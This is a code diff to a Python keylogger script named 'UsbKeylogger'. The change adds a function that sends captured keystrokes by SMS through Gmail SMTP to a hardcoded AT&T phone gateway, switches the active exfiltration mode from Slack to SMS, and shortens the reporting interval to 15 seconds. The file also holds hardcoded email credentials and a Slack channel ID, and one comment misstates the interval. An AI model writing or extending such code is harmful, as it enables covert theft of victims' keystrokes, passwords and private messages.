@@ -20,7 +20,7 @@ EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
 EMAIL_PW = "keylogger!!" # Password for Email
 
 # Time Interval Variable
-LOG_INTERVAL = 60 # Every 300 Seconds (5 minutes) a report is sent
+LOG_INTERVAL = 15 # Every 300 Seconds (5 minutes) a report is sent
 
 class UsbKeylogger:
     def __init__(self, reportInterval, reportType):
@@ -59,10 +59,16 @@ class UsbKeylogger:
     def reportSlack(self, postHeader):
             slackPost = postHeader + "\n" + self.keylog # Creates a string variable with the log time interval as the first line and the contents as the body of the post
             slackBot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost) # The slack posts the string variable in the specified channel
+            
+    def reportSMS(self, address, password, txtBody):
+        text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
+        text.starttls() # Starts TLS for security
+        text.login(address, password) # Logs into the email with provided address and password
+        text.sendmail(address, '9733568278@mms.att.net', txtBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
+        text.quit() # Terminates the text server
 
-    #def reportText(self):
-    #def reportDiscord(self):
-    #def reportSkype(self):
+    # def reportDiscord(self):
+    # def reportSkype(self):
 
     def callbackKeyboard(self, event):
         eventName = "[" + event.name + "]"# Create eventName variable
@@ -90,6 +96,8 @@ class UsbKeylogger:
                 self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportEmail function to sends an email of keylog recording
             elif self.reportType == "Slack":
                 self.reportSlack(self.identifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
+            elif self.reportType == "SMS":
+                self.reportSMS(EMAIL, EMAIL_PW, self.keylog) # Calls the reportSMS function to send keylogs via an SMS to an AT&T phone number
 
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         
@@ -111,8 +119,8 @@ if __name__ == "__main__":
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
-        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
+        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
         usbKeylogger.start()
 
